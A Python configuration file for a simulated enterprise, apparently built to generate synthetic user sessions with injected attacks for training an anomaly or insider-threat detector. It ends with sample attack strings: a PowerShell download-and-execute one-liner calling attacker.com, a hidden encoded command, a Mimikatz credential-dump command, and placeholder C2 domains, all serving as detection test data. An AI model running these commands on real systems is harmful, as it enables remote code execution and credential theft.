from models.enums import (
    DepartmentName,
    OperatingSystem,
    DeviceType,
    Browser,
    AccessLevel,
    SensitivityLevel,
    ResourceType,
    AttackType,
)

RANDOM_SEED = 42

# General configurations
DEPARTMENTS = [
    DepartmentName.FINANCE,
    DepartmentName.ENGINEERING,
    DepartmentName.HR,
    DepartmentName.SALES,
    DepartmentName.IT,
    DepartmentName.MARKETING,
]

# =====================================================
# Simulation Settings
# =====================================================

SIMULATION_CONFIG = {
    "employee_count": 200,
    "min_devices": 1,
    "max_devices": 3,
    "min_session_minutes": 10,
    "max_session_minutes": 120,
    "max_actions_per_session": 30,
    "simulation_days": 30,
}

DEFAULT_DEVICE_PROBABILITIES = {
    DeviceType.LAPTOP: 0.70,
    DeviceType.DESKTOP: 0.20,
    DeviceType.MOBILE: 0.10,
}

BEHAVIOR_PROFILE_DEFAULTS = {
    "average_session_length": 35,
    "session_length_stddev": 8,
    "average_actions": 14,
    "actions_stddev": 3,
    "average_sessions_per_day": 3,
    "remote_work_probability": 0.25,
}

# =====================================================
# Validation and Time Settings
# =====================================================
WORKING_HOUR_BUFFER_MINUTES = 120

WEEKEND_WORK_PROBABILITY = {
    DepartmentName.FINANCE: 0.02,
    DepartmentName.ENGINEERING: 0.10,
    DepartmentName.HR: 0.01,
    DepartmentName.SALES: 0.15,
    DepartmentName.IT: 0.25,
    DepartmentName.MARKETING: 0.05
}

OFFICE_LOCATIONS = ["New York", "San Francisco", "London", "Tokyo", "Munich"]

# Department specific distributions for preferred Operating Systems
# Values sum to 1.0
DEPARTMENT_OS_DISTRIBUTION = {
    DepartmentName.FINANCE: {
        OperatingSystem.WINDOWS: 0.85,
        OperatingSystem.MACOS: 0.15,
        OperatingSystem.LINUX: 0.0
    },
    DepartmentName.ENGINEERING: {
        OperatingSystem.LINUX: 0.50,
        OperatingSystem.MACOS: 0.35,
        OperatingSystem.WINDOWS: 0.15
    },
    DepartmentName.HR: {
        OperatingSystem.WINDOWS: 0.90,
        OperatingSystem.MACOS: 0.10,
        OperatingSystem.LINUX: 0.0
    },
    DepartmentName.SALES: {
        OperatingSystem.WINDOWS: 0.80,
        OperatingSystem.MACOS: 0.20,
        OperatingSystem.LINUX: 0.0
    },
    DepartmentName.IT: {
        OperatingSystem.LINUX: 0.60,
        OperatingSystem.WINDOWS: 0.20,
        OperatingSystem.MACOS: 0.20
    },
    DepartmentName.MARKETING: {
        OperatingSystem.WINDOWS: 0.60,
        OperatingSystem.MACOS: 0.40,
        OperatingSystem.LINUX: 0.0
    }
}

# Browser distribution by Operating System
OS_BROWSER_DISTRIBUTION = {
    OperatingSystem.WINDOWS: {
        Browser.CHROME: 0.60,
        Browser.EDGE: 0.25,
        Browser.FIREFOX: 0.15
    },
    OperatingSystem.LINUX: {
        Browser.CHROME: 0.50,
        Browser.FIREFOX: 0.50
    },
    OperatingSystem.MACOS: {
        Browser.CHROME: 0.50,
        Browser.SAFARI: 0.40,
        Browser.FIREFOX: 0.10
    },
    OperatingSystem.IOS: {
        Browser.SAFARI: 0.90,
        Browser.CHROME: 0.10
    },
    OperatingSystem.ANDROID: {
        Browser.CHROME: 0.85,
        Browser.FIREFOX: 0.15
    }
}

# Device type distribution by Department for primary device
DEPARTMENT_DEVICE_TYPE_DISTRIBUTION = {
    DepartmentName.FINANCE: {
        DeviceType.LAPTOP: 0.70,
        DeviceType.DESKTOP: 0.30
    },
    DepartmentName.ENGINEERING: {
        DeviceType.LAPTOP: 0.85,
        DeviceType.DESKTOP: 0.15
    },
    DepartmentName.HR: {
        DeviceType.LAPTOP: 0.60,
        DeviceType.DESKTOP: 0.40
    },
    DepartmentName.SALES: {
        DeviceType.LAPTOP: 0.80,
        DeviceType.DESKTOP: 0.20
    },
    DepartmentName.IT: {
        DeviceType.LAPTOP: 0.70,
        DeviceType.DESKTOP: 0.30
    },
    DepartmentName.MARKETING: {
        DeviceType.LAPTOP: 0.80,
        DeviceType.DESKTOP: 0.20
    }
}

# Roles per department
ROLES_BY_DEPARTMENT = {
    DepartmentName.FINANCE: ["Accountant", "Finance Analyst", "Treasurer", "Finance Director"],
    DepartmentName.ENGINEERING: ["Software Engineer", "QA Engineer", "DevOps Engineer", "Engineering Manager", "Architect"],
    DepartmentName.HR: ["HR Coordinator", "Recruiter", "HR Specialist", "HR Director"],
    DepartmentName.SALES: ["Sales Representative", "Account Executive", "Sales Manager", "Sales Director"],
    DepartmentName.IT: ["Systems Administrator", "Helpdesk Support", "Network Engineer", "Security Analyst", "IT Director"],
    DepartmentName.MARKETING: ["Marketing Coordinator", "Marketing Specialist", "Marketing Manager", "Marketing Director"]
}

# Access level mapping based on role suffixes or specific roles
ROLE_ACCESS_MAPPING = {
    "Director": AccessLevel.CRITICAL,
    "Manager": AccessLevel.HIGH,
    "Administrator": AccessLevel.HIGH,
    "Architect": AccessLevel.HIGH,
    "Security Analyst": AccessLevel.HIGH,
    "DevOps Engineer": AccessLevel.MEDIUM,
    "Systems Administrator": AccessLevel.HIGH,
    "Network Engineer": AccessLevel.HIGH,
    "Software Engineer": AccessLevel.MEDIUM,
    "Finance Analyst": AccessLevel.MEDIUM,
    "Treasurer": AccessLevel.MEDIUM,
    "HR Specialist": AccessLevel.MEDIUM,
    "Account Executive": AccessLevel.MEDIUM,
    "Accountant": AccessLevel.LOW,
    "QA Engineer": AccessLevel.LOW,
    "Recruiter": AccessLevel.LOW,
    "HR Coordinator": AccessLevel.LOW,
    "Sales Representative": AccessLevel.LOW,
    "Helpdesk Support": AccessLevel.LOW,
    "Marketing Specialist": AccessLevel.MEDIUM,
    "Marketing Coordinator": AccessLevel.LOW,
}

# Resource templates defined in the system
RESOURCES_CONFIG = [
    {"name": ResourceType.PAYROLL, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.FINANCE_DB, "type": "Database", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.EMAIL, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.ENGINEERING, DepartmentName.HR, DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.GITHUB, "type": "SaaS", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT]},
    {"name": ResourceType.JIRA, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.SALES, DepartmentName.IT, DepartmentName.HR, DepartmentName.FINANCE, DepartmentName.MARKETING]},
    {"name": ResourceType.SLACK, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.ENGINEERING, DepartmentName.HR, DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.FILE_SERVER, "type": "Network Share", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT, DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.MARKETING]},
    {"name": ResourceType.HR_PORTAL, "type": "Web Application", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.CRM, "type": "SaaS", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.ADMIN_CONSOLE, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]},
    {"name": ResourceType.SERVERS, "type": "Infrastructure", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]},
    {"name": ResourceType.VPN, "type": "Network Service", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT, DepartmentName.ENGINEERING, DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.SALES, DepartmentName.MARKETING]},
    {"name": ResourceType.CONFLUENCE, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT, DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.SALES, DepartmentName.MARKETING]},
    {"name": ResourceType.TERMINAL, "type": "App", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT]},
    {"name": ResourceType.HRMS, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.EMPLOYEE_RECORDS, "type": "Database", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.ERP, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.ACCOUNTING, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.INVOICES, "type": "Database", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.MEETINGS, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.ENGINEERING, DepartmentName.HR, DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.ANALYTICS, "type": "SaaS", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.MARKETING, DepartmentName.SALES, DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.CAMPAIGN_DASHBOARD, "type": "Web Application", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.MARKETING, DepartmentName.IT]},
    {"name": ResourceType.MONITORING, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]},
    {"name": ResourceType.FIREWALL, "type": "Network Service", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]}
]

# Work Hours by Department
WORK_HOURS_CONFIG = {
    DepartmentName.FINANCE: (9, 18),
    DepartmentName.ENGINEERING: (9, 18),
    DepartmentName.HR: (9, 18),
    DepartmentName.SALES: (8, 17),
    DepartmentName.IT: (8, 18),
    DepartmentName.MARKETING: (9, 18)
}

# Department resource preferences
DEPARTMENT_RESOURCE_PREFERENCES = {
    DepartmentName.FINANCE: {
        "frequent": [ResourceType.ERP, ResourceType.ACCOUNTING, ResourceType.INVOICES, ResourceType.EMAIL],
        "rare": [ResourceType.GITHUB, ResourceType.MEETINGS]
    },
    DepartmentName.ENGINEERING: {
        "frequent": [ResourceType.GITHUB, ResourceType.JIRA, ResourceType.CONFLUENCE, ResourceType.TERMINAL, ResourceType.SLACK],
        "rare": [ResourceType.PAYROLL]
    },
    DepartmentName.HR: {
        "frequent": [ResourceType.HRMS, ResourceType.PAYROLL, ResourceType.EMPLOYEE_RECORDS, ResourceType.EMAIL],
        "rare": [ResourceType.JIRA]
    },
    DepartmentName.SALES: {
        "frequent": [ResourceType.CRM, ResourceType.EMAIL, ResourceType.MEETINGS, ResourceType.SLACK],
        "rare": [ResourceType.FILE_SERVER]
    },
    DepartmentName.IT: {
        "frequent": [ResourceType.ADMIN_CONSOLE, ResourceType.SERVERS, ResourceType.VPN, ResourceType.MONITORING, ResourceType.FIREWALL, ResourceType.FILE_SERVER],
        "rare": []
    },
    DepartmentName.MARKETING: {
        "frequent": [ResourceType.ANALYTICS, ResourceType.CAMPAIGN_DASHBOARD, ResourceType.EMAIL, ResourceType.SLACK, ResourceType.CRM],
        "rare": [ResourceType.FILE_SERVER]
    }
}

# VPN connection probability by department
VPN_PROBABILITIES = {
    DepartmentName.FINANCE: 0.15,
    DepartmentName.ENGINEERING: 0.45,
    DepartmentName.HR: 0.05,
    DepartmentName.SALES: 0.70,
    DepartmentName.IT: 0.60,
    DepartmentName.MARKETING: 0.20
}

# =====================================================
# Anomaly Injection Configurations
# =====================================================
ANOMALY_CONFIG = {
    "global_anomaly_rate": 0.08,  # ~8% of sessions will be anomalous
    "attack_probabilities": {
        AttackType.IMPOSSIBLE_TRAVEL: 0.10,
        AttackType.BRUTE_FORCE: 0.10,
        AttackType.CREDENTIAL_STUFFING: 0.08,
        AttackType.PRIVILEGE_ESCALATION: 0.08,
        AttackType.DATA_EXFILTRATION: 0.10,
        AttackType.INSIDER_THREAT: 0.08,
        AttackType.OFF_HOURS_ACCESS: 0.08,
        AttackType.LATERAL_MOVEMENT: 0.08,
        AttackType.USB_DATA_THEFT: 0.06,
        AttackType.MALWARE_EXECUTION: 0.06,
        AttackType.SUSPICIOUS_POWERSHELL: 0.06,
        AttackType.BEACONING_C2: 0.04,
        AttackType.DEVICE_SPOOFING: 0.04,
        AttackType.LOW_SLOW_EXFILTRATION: 0.02,
        AttackType.INSIDER_DRIFT: 0.02,
    },
    "attack_severities": {
        AttackType.OFF_HOURS_ACCESS: 40.0,
        AttackType.INSIDER_THREAT: 60.0,
        AttackType.IMPOSSIBLE_TRAVEL: 60.0,
        AttackType.BRUTE_FORCE: 80.0,
        AttackType.CREDENTIAL_STUFFING: 80.0,
        AttackType.LATERAL_MOVEMENT: 80.0,
        AttackType.USB_DATA_THEFT: 80.0,
        AttackType.MALWARE_EXECUTION: 95.0,
        AttackType.PRIVILEGE_ESCALATION: 95.0,
        AttackType.DATA_EXFILTRATION: 95.0,
        AttackType.SUSPICIOUS_POWERSHELL: 90.0,
        AttackType.BEACONING_C2: 85.0,
        AttackType.DEVICE_SPOOFING: 75.0,
        AttackType.LOW_SLOW_EXFILTRATION: 85.0,
        AttackType.INSIDER_DRIFT: 50.0,
    },
    "risk_modifiers": {
        "failed_login": 5.0,
        "unauthorized_admin": 15.0,
        "large_transfer": 20.0,
        "suspicious_cli": 20.0,
    }
}

# Configurable Risk Engine Weights
RISK_WEIGHTS = {
    "behavior_deviation": 0.30,
    "attack_severity": 0.40,
    "reconstruction_error": 0.15,
    "classifier_confidence": 0.15
}

# Behavior Knowledge Base settings
ENABLE_DRIFT_MONITORING = False  # Enabled dynamically if historical data is sufficient
DRIFT_WINDOW_SIZE = 10           # Slide baseline over the last 10 sessions


ATTACK_PAYLOADS = {
    "malware_filenames": [
        "mimikatz.exe",
        "wannacry.exe",
        "revshell.ps1",
        "pwnage.elf",
        "keylogger.exe",
        "cobaltstrike.beacon"
    ],
    "powershell_commands": [
        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand a2V5bG9nZ2Vy",
        "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://attacker.com/payload'))\"",
        "powershell.exe Invoke-Mimikatz -DumpCreds",
        "powershell.exe -ep bypass -command Get-Process"
    ],
    "beacon_intervals": [5, 10, 30, 60],
    "suspicious_files": [
        "salaries_2026.xlsx",
        "passwords.txt",
        "source_code.zip",
        "db_dump.sql",
        "customer_credit_cards.csv",
        "m&a_plans.docx"
    ],
    "c2_domains": [
        "malicious-c2.com",
        "198.51.100.42",
        "super-safe-update.org",
        "shady-traffic.net"
    ]
}
